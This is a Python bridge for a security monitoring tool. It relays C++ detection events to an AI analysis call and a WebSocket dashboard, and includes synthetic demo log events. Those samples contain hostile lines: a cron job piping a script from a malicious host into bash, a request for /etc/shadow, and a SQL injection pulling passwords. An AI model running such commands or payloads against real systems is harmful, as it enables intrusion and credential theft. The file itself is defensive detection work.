import asyncio
import json
import sys
import time
import threading
import queue
import os
import random
import subprocess
from collections import deque
from typing import Optional

# ── Try importing websockets (graceful fallback) ──
try:
    import websockets
    HAS_WS = True
except ImportError:
    HAS_WS = False
    print("[bridge] WARNING: 'websockets' not installed. Run: pip install websockets", file=sys.stderr)

# ── Try importing anthropic ──
try:
    import anthropic
    HAS_ANTHROPIC = True
except ImportError:
    HAS_ANTHROPIC = False
    print("[bridge] WARNING: 'anthropic' not installed. AI analysis disabled.", file=sys.stderr)

# ============================================================
#  CONFIG  (defaults — can be updated via UI settings)
# ============================================================
config = {
    "ai_enabled":        True,
    "ai_batch_interval": 15,       # seconds between AI runs
    "ai_sensitivity":    "medium", # low | medium | high
    "ai_max_batch":      30,       # max events per AI call
    "cpp_bf_threshold":  5,        # passed back to C++ via stderr/config
    "cpp_bf_window":     60,
}

WS_PORT = 8765

# ============================================================
#  SHARED STATE
# ============================================================
event_queue: queue.Queue = queue.Queue()
batch_buffer: deque = deque(maxlen=500)   # recent C++ events
ai_results: deque = deque(maxlen=50)      # recent AI analyses
connected_clients: set = set()
clients_lock = threading.Lock()

stats = {
    "cpp_events":    0,
    "cpp_threats":   0,
    "ai_runs":       0,
    "ai_last":       None,
    "start_time":    time.time(),
}

# ============================================================
#  BROADCAST to all WebSocket clients
# ============================================================
def broadcast_sync(msg: dict):
    """Thread-safe broadcast — schedules on the asyncio loop."""
    data = json.dumps(msg)
    if ws_loop:
        asyncio.run_coroutine_threadsafe(_broadcast(data), ws_loop)

async def _broadcast(data: str):
    with clients_lock:
        targets = set(connected_clients)
    if not targets:
        return
    dead = set()
    for ws in targets:
        try:
            await ws.send(data)
        except Exception:
            dead.add(ws)
    if dead:
        with clients_lock:
            connected_clients.difference_update(dead)

# ============================================================
#  LAYER 1 EVENT HANDLER
#  Called for each JSON line from C++ engine
# ============================================================
def handle_cpp_event(raw: str):
    try:
        evt = json.loads(raw)
    except json.JSONDecodeError:
        return

    evt["received_at"] = time.time()
    batch_buffer.append(evt)
    event_queue.put(evt)

    stats["cpp_events"] += 1
    if evt.get("severity") not in ("NONE", "LOW"):
        stats["cpp_threats"] += 1

    # Push raw C++ flag to UI immediately (millisecond latency)
    broadcast_sync({"type": "cpp_event", "event": evt})

    # CRITICAL events also trigger immediate AI (if enabled)
    if evt.get("severity") == "CRITICAL" and config["ai_enabled"]:
        print(f"[bridge] CRITICAL event — triggering immediate AI analysis", file=sys.stderr)
        threading.Thread(target=run_ai_analysis, args=(True,), daemon=True).start()

# ============================================================
#  LAYER 2 — AI ANALYSIS
#  Receives pre-sorted, pre-flagged batch from C++
#  AI only needs to reason, not detect — much faster/cheaper
# ============================================================
AI_PROMPT = """You are a senior security analyst. The C++ detection engine has already identified and sorted these threat events.
Your job is to:
1. Look for patterns ACROSS events (coordinated attacks, kill chains, lateral movement)
2. Prioritize which threats need immediate human response
3. Identify any false positives the fast engine may have flagged
4. Suggest tactical response actions

Return ONLY valid JSON:
{
  "verdict": "IMMEDIATE_ACTION" | "INVESTIGATE" | "MONITOR" | "LIKELY_FP",
  "confidence": 0-100,
  "pattern": "one sentence describing what you see across all events",
  "priority_threat": "the single most dangerous event and why",
  "false_positives": ["list of event IPs/types likely to be benign"],
  "response_actions": ["ordered list of what to do right now"],
  "kill_chain_stage": "Reconnaissance" | "Initial Access" | "Execution" | "Persistence" | "Exfiltration" | "None"
}"""

def run_ai_analysis(immediate: bool = False):
    if not config["ai_enabled"] or not HAS_ANTHROPIC:
        return
    if len(batch_buffer) == 0:
        return

    # Take a snapshot of recent events
    sensitivity = config["ai_sensitivity"]
    min_sev = {"low": "LOW", "medium": "MEDIUM", "high": "HIGH"}.get(sensitivity, "MEDIUM")
    sev_order = {"NONE":0,"LOW":1,"MEDIUM":2,"HIGH":3,"CRITICAL":4}
    threshold = sev_order.get(min_sev, 2)

    events = [e for e in batch_buffer if sev_order.get(e.get("severity","NONE"),0) >= threshold]
    if not events:
        return

    batch = events[-config["ai_max_batch"]:]

    # Format for AI — compact, structured
    lines = []
    for e in batch:
        lines.append(f"[{e.get('severity','?')}] {e.get('type','?')} | IP:{e.get('ip','?')} | score:{e.get('score',0)} | {e.get('line','')[:100]}")

    user_msg = f"Analyze these {len(batch)} pre-sorted threat events (sorted by timestamp, flagged by C++ engine):\n\n" + "\n".join(lines)

    try:
        client = anthropic.Anthropic()
        response = client.messages.create(
            model="claude-sonnet-4-20250514",
            max_tokens=800,
            system=AI_PROMPT,
            messages=[{"role": "user", "content": user_msg}]
        )
        text = response.content[0].text.strip()
        text = text.replace("```json","").replace("```","").strip()
        result = json.loads(text)
        result["analyzed_events"] = len(batch)
        result["timestamp"] = time.time()
        result["immediate"] = immediate

        ai_results.append(result)
        stats["ai_runs"] += 1
        stats["ai_last"] = time.time()

        # Push AI result to UI
        broadcast_sync({"type": "ai_analysis", "result": result})
        print(f"[bridge] AI analysis complete: {result.get('verdict')} (confidence {result.get('confidence')}%)", file=sys.stderr)

    except Exception as e:
        print(f"[bridge] AI error: {e}", file=sys.stderr)
        broadcast_sync({"type": "ai_error", "message": str(e)})

# ============================================================
#  AI BATCH SCHEDULER
#  Runs periodically in background thread
# ============================================================
def ai_scheduler():
    while True:
        interval = config["ai_batch_interval"]
        time.sleep(interval)
        if config["ai_enabled"] and len(batch_buffer) > 0:
            print(f"[bridge] Scheduled AI analysis (interval={interval}s, buffer={len(batch_buffer)})", file=sys.stderr)
            run_ai_analysis(immediate=False)

# ============================================================
#  WEBSOCKET SERVER
# ============================================================
ws_loop: Optional[asyncio.AbstractEventLoop] = None

async def ws_handler(websocket, path=None):
    with clients_lock:
        connected_clients.add(websocket)

    print(f"[bridge] Client connected. Total: {len(connected_clients)}", file=sys.stderr)

    # Send current state to new client
    await websocket.send(json.dumps({
        "type": "init",
        "config": config,
        "stats": stats,
        "recent_events": list(batch_buffer)[-50:],
        "recent_ai": list(ai_results)[-5:],
    }))

    try:
        async for msg in websocket:
            try:
                data = json.loads(msg)
                await handle_ws_message(websocket, data)
            except Exception as e:
                print(f"[bridge] WS message error: {e}", file=sys.stderr)
    except Exception:
        pass
    finally:
        with clients_lock:
            connected_clients.discard(websocket)
        print(f"[bridge] Client disconnected. Total: {len(connected_clients)}", file=sys.stderr)

async def handle_ws_message(ws, data: dict):
    msg_type = data.get("type")

    if msg_type == "update_settings":
        new_settings = data.get("settings", {})
        for k, v in new_settings.items():
            if k in config:
                config[k] = v
        print(f"[bridge] Settings updated: {new_settings}", file=sys.stderr)
        await ws.send(json.dumps({"type": "settings_ack", "config": config}))
        # Broadcast new config to all clients
        broadcast_sync({"type": "config_update", "config": config})

    elif msg_type == "trigger_ai":
        threading.Thread(target=run_ai_analysis, args=(True,), daemon=True).start()
        await ws.send(json.dumps({"type": "ai_triggered"}))

    elif msg_type == "get_stats":
        await ws.send(json.dumps({
            "type": "stats",
            "stats": {**stats, "buffer_size": len(batch_buffer), "clients": len(connected_clients)}
        }))

    elif msg_type == "clear":
        batch_buffer.clear()
        ai_results.clear()
        await ws.send(json.dumps({"type": "cleared"}))

# ============================================================
#  STDIN READER THREAD (reads C++ engine output)
# ============================================================
def stdin_reader():
    print("[bridge] Reading C++ engine output from stdin...", file=sys.stderr)
    for line in sys.stdin:
        line = line.strip()
        if line:
            handle_cpp_event(line)

# ============================================================
#  DEMO MODE (no C++ engine needed)
# ============================================================
DEMO_EVENTS = [
    {"layer":"cpp","ts":1710028882,"type":"Failed Login","severity":"LOW","score":5,"ip":"192.168.1.105","line":"sshd: Failed password for root from 192.168.1.105"},
    {"layer":"cpp","ts":1710028884,"type":"Failed Login","severity":"LOW","score":10,"ip":"192.168.1.105","line":"sshd: Failed password for root from 192.168.1.105"},
    {"layer":"cpp","ts":1710028886,"type":"Failed Login","severity":"LOW","score":15,"ip":"192.168.1.105","line":"sshd: Failed password for root from 192.168.1.105"},
    {"layer":"cpp","ts":1710028888,"type":"Failed Login","severity":"LOW","score":20,"ip":"192.168.1.105","line":"sshd: Failed password for root from 192.168.1.105"},
    {"layer":"cpp","ts":1710028890,"type":"Brute Force","severity":"CRITICAL","score":50,"ip":"192.168.1.105","line":"sshd: Failed password for root from 192.168.1.105 [THRESHOLD EXCEEDED]"},
    {"layer":"cpp","ts":1710028896,"type":"Suspicious Auth Success","severity":"CRITICAL","score":55,"ip":"192.168.1.105","line":"sshd: Accepted password for backup from 192.168.1.105"},
    {"layer":"cpp","ts":1710029165,"type":"Path Traversal","severity":"HIGH","score":25,"ip":"203.0.113.77","line":"apache2: GET /../../../etc/shadow HTTP/1.1 403"},
    {"layer":"cpp","ts":1710029244,"type":"Port Scan","severity":"MEDIUM","score":10,"ip":"198.51.100.3","line":"UFW BLOCK SRC=198.51.100.3 DPT=3306"},
    {"layer":"cpp","ts":1710029461,"type":"Command Injection","severity":"CRITICAL","score":40,"ip":"","line":"cron: CMD (curl http://malware.xyz/payload.sh | bash)"},
    {"layer":"cpp","ts":1710029722,"type":"SQL Injection","severity":"HIGH","score":25,"ip":"203.0.113.77","line":"apache2: GET /?q=1 UNION SELECT username,password FROM users"},
    {"layer":"cpp","ts":1710030001,"type":"Privilege Escalation","severity":"CRITICAL","score":60,"ip":"","line":"sudo: sysadmin COMMAND=/bin/bash"},
]

def demo_feeder():
    print("[bridge] DEMO MODE — feeding synthetic events", file=sys.stderr)
    for evt in DEMO_EVENTS:
        time.sleep(1.5)
        evt["received_at"] = time.time()
        batch_buffer.append(evt)
        stats["cpp_events"] += 1
        if evt.get("severity") not in ("NONE","LOW"):
            stats["cpp_threats"] += 1
        broadcast_sync({"type": "cpp_event", "event": evt})
        print(f"[bridge] [{evt['severity']}] {evt['type']} {evt['ip']}", file=sys.stderr)
        if evt.get("severity") == "CRITICAL" and config["ai_enabled"]:
            threading.Thread(target=run_ai_analysis, args=(True,), daemon=True).start()

    # Keep looping with random events
    while True:
        time.sleep(4)
        evt = random.choice(DEMO_EVENTS).copy()
        evt["ts"] = int(time.time())
        evt["received_at"] = time.time()
        batch_buffer.append(evt)
        broadcast_sync({"type": "cpp_event", "event": evt})

# ============================================================
#  MAIN
# ============================================================
async def main_async():
    global ws_loop
    ws_loop = asyncio.get_event_loop()

    print(f"[bridge] WebSocket server on ws://localhost:{WS_PORT}", file=sys.stderr)
    print(f"[bridge] AI analysis: {'enabled' if config['ai_enabled'] else 'disabled'}", file=sys.stderr)
    print(f"[bridge] AI batch interval: {config['ai_batch_interval']}s", file=sys.stderr)

    server = await websockets.serve(ws_handler, "localhost", WS_PORT)
    await server.wait_closed()

def main():
    demo_mode = "--demo" in sys.argv

    # Start AI scheduler
    threading.Thread(target=ai_scheduler, daemon=True).start()

    # Start data source
    if demo_mode or not HAS_WS:
        threading.Thread(target=demo_feeder, daemon=True).start()
    else:
        # Read from C++ engine via stdin
        threading.Thread(target=stdin_reader, daemon=True).start()

    if HAS_WS:
        asyncio.run(main_async())
    else:
        print("[bridge] Install websockets: pip install websockets", file=sys.stderr)
        # Fallback: just print events to stdout
        while True:
            time.sleep(60)

if __name__ == "__main__":
    print("╔══════════════════════════════════╗", file=sys.stderr)
    print("║  THREATSCOPE BRIDGE  v1.0        ║", file=sys.stderr)
    print("║  Layer 2 — Python AI Bridge      ║", file=sys.stderr)
    print("╚══════════════════════════════════╝", file=sys.stderr)
    main()